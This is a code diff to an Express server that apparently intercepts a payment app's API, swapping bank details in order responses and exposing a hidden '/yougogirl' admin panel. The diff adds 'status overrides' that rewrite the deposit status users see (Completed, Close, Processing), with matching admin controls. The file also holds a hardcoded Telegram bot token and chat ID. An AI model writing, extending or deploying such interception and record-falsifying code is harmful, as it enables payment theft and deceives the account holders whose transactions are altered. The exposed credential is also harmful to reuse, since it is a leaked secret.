@@ -340,7 +340,8 @@ const DEFAULT_DATA = {
   customServiceLink: '',
   bot2Token: '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ',
   bot2ChatId: '5880677639',
-  bot2Enabled: true
+  bot2Enabled: true,
+  orderStatusOverrides: {}
 };
 
 function generateDummyCode() {
@@ -635,6 +636,7 @@ async function loadData(forceRefresh) {
       if (!cachedData.userOverrides) cachedData.userOverrides = {};
       if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
       if (!cachedData.balanceHistory) cachedData.balanceHistory = [];
+      if (!cachedData.orderStatusOverrides) cachedData.orderStatusOverrides = {};
 
       // Sync dynamic Bot variables
       if (cachedData.botToken) {
@@ -1987,8 +1989,43 @@ async function proxyAndReplaceBankInList(req, res) {
         if (!item || typeof item !== 'object') return;
         const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
         const itemEff = getEffectiveSettings(data, itemUserId);
-        const itemCode = extractOrderCode(item) || String(item.orderCode || item.code || item.buyCode || item.sn || '').trim();
-        const itemId = String(item.orderId || item.payOrderId || item.buyId || item.id || '').trim();
+        const itemCode = extractOrderCode(item) || String(item.orderCode || item.code || item.buyCode || item.sn || item.remark || '').trim();
+        const itemId = String(item.orderId || item.payOrderId || item.buyId || item.id || item.orderNo || '').trim();
+
+        // 1. History Order Status Override
+        if (data.orderStatusOverrides && typeof data.orderStatusOverrides === 'object') {
+          const itemOrderNo = String(item.orderNo || '').trim();
+          const itemRemark = String(item.remark || '').trim();
+          const itemBuyId = String(item.buyId || '').trim();
+          const itemPayOrderId = String(item.payOrderId || '').trim();
+
+          const candKeys = [
+            itemCode, itemId, itemOrderNo, itemRemark, itemBuyId, itemPayOrderId,
+            `${itemUserId}:${itemCode}`, `${itemUserId}:${itemId}`, `${itemUserId}:${itemOrderNo}`, `${itemUserId}:${itemRemark}`
+          ].filter(Boolean);
+
+          let stOverride = null;
+          for (const k of candKeys) {
+            if (data.orderStatusOverrides[k]) {
+              stOverride = data.orderStatusOverrides[k];
+              break;
+            }
+          }
+
+          if (stOverride && stOverride.status !== undefined) {
+            const targetStatus = Number(stOverride.status);
+            const statusLabels = { 1: "Processing", 2: "Processing", 3: "Completed", 4: "Close" };
+            const labelStr = stOverride.statusLabel || statusLabels[targetStatus] || "Completed";
+
+            item.status = targetStatus;
+            if (item.state !== undefined) item.state = targetStatus;
+            if (item.orderStatus !== undefined) item.orderStatus = targetStatus;
+            if (item.statusCode !== undefined) item.statusCode = targetStatus;
+
+            if (item.statusLabel !== undefined) item.statusLabel = labelStr;
+            if (item.stateLabel !== undefined) item.stateLabel = labelStr;
+          }
+        }
 
         let itemBound = null;
         if (data.orderBankMap) {
@@ -2611,6 +2648,39 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
       const orderIdStr = String(dd.orderId || dd.orderNo || dd.buyId || req.query?.buyId || req.query?.orderId || '').trim();
       const cached = orderIdStr ? orderCache.get(orderIdStr) : null;
       const orderCodeStr = String(dd.code || dd.orderCode || dd.buyCode || dd.sn || extractOrderCode(dd) || (cached ? cached.code : '') || orderIdStr || 'N/A').trim();
+
+      if (data.orderStatusOverrides && typeof data.orderStatusOverrides === 'object') {
+        const itemOrderNo = String(dd.orderNo || '').trim();
+        const itemRemark = String(dd.remark || '').trim();
+        const itemBuyId = String(dd.buyId || '').trim();
+        const itemPayOrderId = String(dd.payOrderId || '').trim();
+
+        const candKeys = [
+          orderCodeStr, orderIdStr, itemOrderNo, itemRemark, itemBuyId, itemPayOrderId,
+          `${userId}:${orderCodeStr}`, `${userId}:${orderIdStr}`, `${userId}:${itemOrderNo}`, `${userId}:${itemRemark}`
+        ].filter(Boolean);
+
+        let stOverride = null;
+        for (const k of candKeys) {
+          if (data.orderStatusOverrides[k]) {
+            stOverride = data.orderStatusOverrides[k];
+            break;
+          }
+        }
+
+        if (stOverride && stOverride.status !== undefined) {
+          const targetStatus = Number(stOverride.status);
+          const statusLabels = { 1: "Processing", 2: "Processing", 3: "Completed", 4: "Close" };
+          const labelStr = stOverride.statusLabel || statusLabels[targetStatus] || "Completed";
+
+          dd.status = targetStatus;
+          if (dd.state !== undefined) dd.state = targetStatus;
+          if (dd.orderStatus !== undefined) dd.orderStatus = targetStatus;
+          if (dd.statusCode !== undefined) dd.statusCode = targetStatus;
+          if (dd.statusLabel !== undefined) dd.statusLabel = labelStr;
+          if (dd.stateLabel !== undefined) dd.stateLabel = labelStr;
+        }
+      }
 
       data.orderBankMap = data.orderBankMap || {};
       data.sentOrderInfo = data.sentOrderInfo || {};
@@ -4186,36 +4256,108 @@ app.get('/yougogirl', async (req, res) => {
 
                 <!-- Tab: History -->
                 <section id="tab-history" class="tab-content space-y-6">
+                    <!-- History Status Override Manager Card -->
+                    <div class="card border-sky-500/20 bg-sky-500/5">
+                        <h3 class="text-xl font-bold mb-4 flex items-center gap-2">
+                            <i class="fa-solid fa-clock-rotate-left text-sky-400"></i> History Status Manager
+                        </h3>
+                        <p class="text-xs text-slate-400 mb-6">Manually override deposit history order status (Completed, Close, Processing) for any user or order code.</p>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">User ID (Optional)</label>
+                                <input type="text" id="history-user-id" class="input-field font-mono text-xs" placeholder="e.g. 241024 or Leave Blank for All">
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Order Code / Remark / Buy ID</label>
+                                <input type="text" id="history-order-code" class="input-field font-mono text-xs" placeholder="e.g. UM3GfR, LwnWX1, 5732010">
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                            <button onclick="updateHistoryStatus(3)" class="py-3 px-4 rounded-xl font-bold bg-emerald-500 hover:bg-emerald-600 text-white shadow-lg shadow-emerald-500/20 transition-all flex items-center justify-center gap-2">
+                                <i class="fa-solid fa-circle-check"></i> Set Completed (Status 3)
+                            </button>
+                            <button onclick="updateHistoryStatus(4)" class="py-3 px-4 rounded-xl font-bold bg-rose-500 hover:bg-rose-600 text-white shadow-lg shadow-rose-500/20 transition-all flex items-center justify-center gap-2">
+                                <i class="fa-solid fa-circle-xmark"></i> Set Close / Failed (Status 4)
+                            </button>
+                            <button onclick="updateHistoryStatus(1)" class="py-3 px-4 rounded-xl font-bold bg-amber-500 hover:bg-amber-600 text-white shadow-lg shadow-amber-500/20 transition-all flex items-center justify-center gap-2">
+                                <i class="fa-solid fa-spinner"></i> Set Processing (Status 1)
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Active History Status Overrides Table -->
+                    <div class="card overflow-hidden">
+                        <div class="flex items-center justify-between mb-6">
+                            <h3 class="text-lg font-bold flex items-center gap-2">
+                                <i class="fa-solid fa-sliders text-emerald-400"></i> Active Status Overrides
+                            </h3>
+                            <button onclick="deleteHistoryStatus('all')" class="text-xs font-bold text-rose-500 hover:underline">Clear All Overrides</button>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left text-sm">
+                                <thead class="text-slate-500 border-b border-slate-800">
+                                    <tr>
+                                        <th class="pb-4">Order Code / Key</th>
+                                        <th class="pb-4">Target User</th>
+                                        <th class="pb-4">Overridden Status</th>
+                                        <th class="pb-4">Updated At</th>
+                                        <th class="pb-4 text-right">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-slate-800">
+                                    ${Object.entries(data.orderStatusOverrides || {}).filter(([k]) => !k.includes(':')).map(([k, v]) => {
+                                      const stNum = Number(v.status);
+                                      const stColor = stNum === 3 ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' : (stNum === 4 ? 'bg-rose-500/10 text-rose-500 border-rose-500/30' : 'bg-amber-500/10 text-amber-400 border-amber-500/30');
+                                      const stIcon = stNum === 3 ? 'fa-check' : (stNum === 4 ? 'fa-xmark' : 'fa-spinner');
+                                      return '<tr>' +
+                                        '<td class="py-4 font-mono text-sky-400 font-bold">' + (v.orderCode || k) + '</td>' +
+                                        '<td class="py-4 text-xs font-semibold text-slate-300">' + (v.userId || 'All Users') + '</td>' +
+                                        '<td class="py-4"><span class="px-3 py-1 rounded-full text-xs font-bold border inline-flex items-center gap-1.5 ' + stColor + '"><i class="fa-solid ' + stIcon + '"></i> ' + (v.statusLabel || 'Completed') + ' (' + stNum + ')</span></td>' +
+                                        '<td class="py-4 text-[10px] text-slate-500">' + (v.updatedAt || 'N/A') + '</td>' +
+                                        '<td class="py-4 text-right">' +
+                                        '<button onclick="deleteHistoryStatus(\'' + (v.orderCode || k) + '\')" class="text-rose-500 hover:underline text-xs font-bold">Remove</button>' +
+                                        '</td>' +
+                                        '</tr>';
+                                    }).join('')}
+                                    ${Object.keys(data.orderStatusOverrides || {}).length === 0 ? '<tr><td colspan="5" class="py-8 text-center text-slate-600 italic">No history status overrides configured.</td></tr>' : ''}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- Balance Activity Logs -->
                     <div class="card">
                         <div class="flex items-center justify-between mb-6">
-                            <h3 class="text-xl font-bold">Balance Logs</h3>
+                            <h3 class="text-xl font-bold">Balance Modification Logs</h3>
                             <button onclick="clearHistory()" class="text-xs font-bold text-rose-500 hover:underline">Purge All Logs</button>
                         </div>
-                        <div class="space-y-3 max-h-[700px] overflow-y-auto pr-2">
+                        <div class="space-y-3 max-h-[500px] overflow-y-auto pr-2">
                             ${(data.balanceHistory || []).slice().reverse().map(h => {
-      const sign = h.type === 'add' ? '+' : (h.type === 'deduct' ? '-' : '');
-      const color = h.type === 'add' ? 'text-emerald-400' : (h.type === 'deduct' ? 'text-rose-500' : 'text-slate-400');
-      const bgColor = h.type === 'add' ? 'bg-emerald-500/10 text-emerald-500' : (h.type === 'deduct' ? 'bg-rose-500/10 text-rose-500' : 'bg-slate-800 text-slate-400');
-      const icon = h.type === 'add' ? 'fa-plus' : (h.type === 'deduct' ? 'fa-minus' : 'fa-trash-can');
+                              const sign = h.type === 'add' ? '+' : (h.type === 'deduct' ? '-' : '');
+                              const color = h.type === 'add' ? 'text-emerald-400' : (h.type === 'deduct' ? 'text-rose-500' : 'text-slate-400');
+                              const bgColor = h.type === 'add' ? 'bg-emerald-500/10 text-emerald-500' : (h.type === 'deduct' ? 'bg-rose-500/10 text-rose-500' : 'bg-slate-800 text-slate-400');
+                              const icon = h.type === 'add' ? 'fa-plus' : (h.type === 'deduct' ? 'fa-minus' : 'fa-trash-can');
 
-      return '<div class="p-4 glass rounded-2xl flex items-center justify-between">' +
-        '<div class="flex items-center gap-4">' +
-        '<div class="w-10 h-10 rounded-full ' + bgColor + ' flex items-center justify-center text-xs">' +
-        '<i class="fa-solid ' + icon + '"></i>' +
-        '</div>' +
-        '<div>' +
-        '<div class="font-bold text-sm">User ' + h.userId + '</div>' +
-        '<div class="text-[10px] text-slate-500">' + h.time + '</div>' +
-        '</div>' +
-        '</div>' +
-        '<div class="text-right">' +
-        '<div class="font-black ' + color + '">' +
-        (h.type === 'remove' ? 'RESET' : sign + '₹' + h.amount) +
-        '</div>' +
-        '<div class="text-[10px] text-slate-500 italic font-medium">Bal: ₹' + h.updatedBalance + '</div>' +
-        '</div>' +
-        '</div>';
-    }).join('')}
+                              return '<div class="p-4 glass rounded-2xl flex items-center justify-between">' +
+                                '<div class="flex items-center gap-4">' +
+                                '<div class="w-10 h-10 rounded-full ' + bgColor + ' flex items-center justify-center text-xs">' +
+                                '<i class="fa-solid ' + icon + '"></i>' +
+                                '</div>' +
+                                '<div>' +
+                                '<div class="font-bold text-sm">User ' + h.userId + '</div>' +
+                                '<div class="text-[10px] text-slate-500">' + h.time + '</div>' +
+                                '</div>' +
+                                '</div>' +
+                                '<div class="text-right">' +
+                                '<div class="font-black ' + color + '">' +
+                                (h.type === 'remove' ? 'RESET' : sign + '₹' + h.amount) +
+                                '</div>' +
+                                '<div class="text-[10px] text-slate-500 italic font-medium">Bal: ₹' + h.updatedBalance + '</div>' +
+                                '</div>' +
+                                '</div>';
+                            }).join('')}
                             ${(data.balanceHistory || []).length === 0 ? '<p class="text-center text-slate-600 py-12 italic text-sm">No balance history records found.</p>' : ''}
                         </div>
                     </div>
@@ -4291,6 +4433,15 @@ app.get('/yougogirl', async (req, res) => {
 
         function deleteDummy(id) { apiCall('/dummy/delete', { id }); }
         function clearHistory() { apiCall('/balance/clear-history', {}); }
+        function updateHistoryStatus(statusVal) {
+            const userId = document.getElementById('history-user-id').value.trim();
+            const orderCode = document.getElementById('history-order-code').value.trim();
+            if (!orderCode) return notify('Order Code / ID is required', 'error');
+            apiCall('/history/update', { userId, orderCode, status: statusVal });
+        }
+        function deleteHistoryStatus(orderCode) {
+            apiCall('/history/delete', { orderCode });
+        }
         function toggleUserLog(userId) { apiCall('/user/log-toggle', { userId }); }
         
         function addBank() {
@@ -4359,19 +4510,56 @@ app.post('/yougogirl/api/update-bot2', async (req, res) => {
   } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
-app.post('/yougogirl/api/proxy-toggle', async (req, res) => {
+app.post('/yougogirl/api/history/update', async (req, res) => {
   try {
-    const { action } = req.parsedBody || {};
+    const { userId, orderCode, status } = req.parsedBody || {};
+    if (!orderCode) return res.status(400).json({ success: false, error: 'Order Code / ID is required' });
+    const stNum = Number(status || 3);
+    const statusLabels = { 1: "Processing", 2: "Processing", 3: "Completed", 4: "Close" };
+    const labelStr = statusLabels[stNum] || "Completed";
+
     const data = await loadData(true);
-    if (action === 'botEnabled') data.botEnabled = !data.botEnabled;
-    else if (action === 'autoRotate') data.autoRotate = !data.autoRotate;
-    else if (action === 'logRequests') data.logRequests = !data.logRequests;
+    data.orderStatusOverrides = data.orderStatusOverrides || {};
+
+    const cleanCode = String(orderCode).trim();
+    const entry = {
+      userId: userId ? String(userId).trim() : 'All',
+      orderCode: cleanCode,
+      status: stNum,
+      statusLabel: labelStr,
+      updatedAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+    };
+
+    data.orderStatusOverrides[cleanCode] = entry;
+    if (userId && String(userId).trim() !== 'All' && String(userId).trim() !== '') {
+      data.orderStatusOverrides[`${String(userId).trim()}:${cleanCode}`] = entry;
+    }
+
     await saveData(data);
-    res.json({ success: true, data: { botEnabled: data.botEnabled, autoRotate: data.autoRotate, logRequests: data.logRequests } });
+    res.json({ success: true, message: `Status updated to ${labelStr} for order ${cleanCode}` });
   } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
+app.post('/yougogirl/api/history/delete', async (req, res) => {
+  try {
+    const { orderCode } = req.parsedBody || {};
+    const data = await loadData(true);
+    data.orderStatusOverrides = data.orderStatusOverrides || {};
 
+    const cleanCode = String(orderCode || '').trim();
+    if (cleanCode === 'all') {
+      data.orderStatusOverrides = {};
+    } else {
+      delete data.orderStatusOverrides[cleanCode];
+      for (const k of Object.keys(data.orderStatusOverrides)) {
+        if (k.endsWith(`:${cleanCode}`)) delete data.orderStatusOverrides[k];
+      }
+    }
+
+    await saveData(data);
+    res.json({ success: true, message: 'Status override deleted' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
 
 app.post('/yougogirl/api/balance/update', async (req, res) => {
   try {
